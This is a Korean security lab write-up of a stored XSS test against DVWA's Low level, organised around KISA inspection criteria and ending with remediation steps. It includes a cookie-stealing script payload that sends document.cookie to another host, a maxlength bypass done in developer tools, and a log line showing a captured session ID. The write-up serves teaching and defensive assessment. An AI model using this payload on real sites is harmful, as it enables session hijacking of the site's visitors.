# XSS (Stored) 취약점 실습

## 개요
- 본 실습에서는 DVWA의 Low 단계에서 XSS (Stored) 취약점을 대상으로 사용자 입력값이  
  서버 DB에 저장된 후 페이지 방문 시악성 스크립트가 자동 실행되는지 확인하여 XSS 취약점 존재 여부를 점검했습니다.

---

## 주요정보통신기반시설 기준
> 출처 : https://www.kisa.or.kr/2060204/form?postSeq=22&page=1#fnPostAttachDownload ( p.711 ~ 714 )

### 점검 내용
- 웹 애플리케이션 내 악성 스크립트가 DB에 저장되어 다른 사용자의 브라우저에서 자동 실행되는 취약점 존재 여부를 점검합니다.

---

### 점검 목적
- 사용자 입력값에 대한 검증을 실시하여, 사용자 세션 탈취, 악성 코드 삽입 등의 악의적인 스크립트 실행을 차단하기 위해서입니다.

---

### 보안 위협
- 사용자 입력값에 대한 필터링이 없을 경우, 공격자는 사용자 입력값 내
  악의적인 스크립트(JavaScript, VBScript, ActiveX, Flash 등)를 삽입하여 사용자의 쿠키(세션)를 탈취하거나 피싱 사이트로 유도하는 등의 악의적인 공격을 수행할 수 있습니다.
- Stored XSS의 경우 스크립트가 DB에 영구 저장되어, 해당 페이지를 방문하는  
  모든 사용자의 브라우저에서 자동으로 스크립트가 실행되어 세션 탈취 및 피싱 공격으로 이어질 수 있습니다.

---

### 판단 기준

#### 양호
- 사용자 입력값에 대해 검증 및 필터링이 이루어져, 악의적인 스크립트가 실행되지 않는 경우

#### 취약
- 사용자 입력값에 대한 검증 및 필터링이 이루어지지 않으며, HTML 코드가 입력 및 실행되는 경우

---

## 점검 절차
1. DVWA XSS (Stored) 페이지 접속 및 구조 확인  
2. 개발자 도구를 통한 입력 필드 속성 확인  
3. 쿠키 탈취 스크립트 삽입 및 DB 저장 여부 확인  
4. 페이지 재방문 시 스크립트 자동 실행 여부 확인  
5. 서버 로그를 통한 쿠키 탈취 흔적 확인  
6. DB 초기화 후 스크립트 제거 여부 확인  

---

## 취약점 검증 및 공격 수행

### 실습 화면
- DVWA의 XSS (Stored) 화면이며, Name과 Message 두 개의 입력 필드가 존재합니다.
- 입력한 내용이 Guestbook 형태로 DB에 저장되어 페이지에 출력되는 구조입니다.

![01](/XSS%20(Stored)/img/01.png)

---

### 페이로드 작성 및 삽입

- 쿠키 탈취 스크립트가 DB에 저장되는지 확인하기 위해 아래 값을 입력했습니다.

```
Name    : 테스트
Message : <script>document.location='http://192.168.11.36/cookie?security=low;'+document.cookie</script>
```

![02](/XSS%20(Stored)/img/02.png)

- Message 필드에 페이로드를 입력하는 과정에서 글자 수 제한으로 인해 페이로드 전체 입력이 불가능한 것을 확인했습니다.
- 개발자 도구(F12)를 통해 Message 필드의 `maxlength` 속성을 확인한 결과 기본값이 `50`으로 설정되어 있었습니다.

```html
<textarea name="mtxMessage" cols="50" rows="3" maxlength="50"></textarea>
```

- `maxlength=50`으로는 아래 페이로드 전체를 입력할 수 없어 개발자 도구에서 직접 값을 `500`으로 수정하였습니다.

```html
<textarea name="mtxMessage" cols="50" rows="3" maxlength="500"></textarea>
```

![03](/XSS%20(Stored)/img/03.png)

- `maxlength` 값 수정 후 페이로드 전체 입력이 가능해진 것을 확인할 수 있습니다.
- 이처럼 클라이언트 사이드에서만 길이 제한을 두는 경우 개발자 도구를 통해 손쉽게 우회가 가능합니다.
- 서버 사이드에서도 입력값 길이 검증이 반드시 병행되어야 합니다.
- 소스코드를 보면 아래와 같이 입력값에 대한 HTML 필터링이 전혀 없음을 확인할 수 있습니다.

```php
  $message = stripslashes( $message );
  $message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message);
  $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
```

- `mysqli_real_escape_string()`은 SQL Injection 방어 목적이며, XSS 필터링과는 무관합니다.
- 입력값이 HTML 인코딩 없이 DB에 그대로 저장되고 있음을 확인할 수 있습니다.

---

### 스크립트 실행 및 쿠키 탈취 확인

- 페이로드 삽입 후 Sign Guestbook 클릭 시 스크립트가 DB에 저장됩니다.
- 이후 해당 페이지를 방문할 때마다 스크립트가 자동으로 실행되어 아래와 같이 서버 로그에 쿠키 값이 기록됩니다.

```bash
tail -f /var/log/apache2/access.log
```

![04](/XSS%20(Stored)/img/04.png)
![05](/XSS%20(Stored)/img/05.png)

```
GET /cookie?security=low;%20PHPSESSID=1af2f54f6bc67d09e94defecb70a327d HTTP/1.1" 404
```

- `/cookie` 경로가 서버에 존재하지 않아 404가 반환되었지만,  
  쿠키 값(`PHPSESSID=1af2f54f6bc67d09e94defecb70a327d`)이 URL에 포함되어 서버 로그에 기록된 것을 확인할 수 있습니다.
- XSS 탭을 열 때마다 동일한 로그가 반복 기록되는 것을 통해 스크립트가 DB에 영구 저장되어 지속 실행됨을 확인할 수 있습니다.
- 실제 공격 환경에서는 공격자 서버에 해당 쿠키가 수신되어 세션 하이재킹에 활용됩니다.

---

### DB 초기화 후 정상 복구 확인

- Setup / Reset DB 메뉴에서 `Create / Reset Database`를 클릭하여 Guestbook을 초기화합니다.

![06](/XSS%20(Stored)/img/06.png)

- 초기화 이후 XSS (Stored) 페이지에 재접속하면 저장된 스크립트가 삭제되어 더 이상 실행되지 않는 것을 확인할 수 있습니다.

![07](/XSS%20(Stored)/img/07.png)

- 이를 통해 Stored XSS의 지속성과 DB 초기화를 통한 제거 방법을 확인할 수 있습니다.

---

## 취약점 분석

- 입력값이 별도의 인코딩이나 필터링 없이 DB에 그대로 저장됩니다.
- 소스코드를 보면 `mysqli_real_escape_string()`만 적용되어 있으며, HTML 인코딩 처리가 전혀 없습니다.

```php
  $message = stripslashes( $message );
  $message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message);  // SQL Injection 방어 목적 — XSS 필터링과 무관
  $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";  // HTML 인코딩 없이 DB에 그대로 저장
```

- 쿠키 탈취 스크립트 삽입 후 해당 페이지를 방문할 때마다 스크립트가 자동 실행되었습니다.
- 서버 로그를 통해 `PHPSESSID` 값이 URL에 포함되어 외부로 전송 시도되는 것을 확인했습니다.
- XSS (Stored) 탭 접근 시마다 로그가 반복 기록되어 Stored XSS의 지속성을 실증했습니다.
- Reflected XSS와 달리 피해자가 악성 링크를 클릭하지 않아도 페이지 방문만으로 공격이 이루어집니다.

**판단 : 취약** — 실제 환경이었다면 세션 탈취, 개인정보 유출, 불특정 다수 대상 공격으로 이어질 수 있습니다.

---

## 대응 방안

### 입력값 검증 및 필터링(HTML 엔티티 변환) 적용
- 크로스사이트 스크립팅 공격에 사용되는 특수문자에 대해 입력값 검증 및 필터링 처리 로직을 서버 사이드에서 구현합니다.

| 변경 전 | 변경 후 |
|---------|---------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `(` | `&#40;` |
| `)` | `&#41;` |
| `#` | `&#35;` |
| `&` | `&amp;` |

- PHP 적용 예시

```php
function escapeHtml($input) {
    return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8', false);
}
```

#### 핵심 효과
- 스크립트 태그가 HTML 태그로 해석되지 않아 실행이 차단됩니다.

---

### 화이트리스트 방식 HTML 코드 처리
- 부득이하게 HTML 코드를 사용해야 하는 경우 화이트리스트 방식을 적용하여 허용된 HTML 코드만 처리합니다.

#### 핵심 효과
- 허용되지 않은 태그 및 스크립트 삽입 시도를 사전에 차단할 수 있습니다.

---

### 웹 방화벽(WAF) 필터링 룰셋 적용
- 웹 방화벽에서 웹 태그 및 스크립트 관련 특수문자 필터링 룰셋을 적용하여 추가적인 방어를 확보합니다.

#### 핵심 효과
- 서버 사이드 필터링이 우회되더라도 추가 방어선을 통해 공격을 차단할 수 있습니다.

---

### 쿠키 보안 옵션 설정
- 세션 탈취 방지를 위해 쿠키에 `HttpOnly`, `Secure`, `SameSite` 옵션을 설정하여 쿠키가 외부에 노출되지 않도록 보호합니다.

#### 핵심 효과
- XSS 취약점이 존재하더라도 쿠키 탈취를 통한 세션 하이재킹을 방지할 수 있습니다.
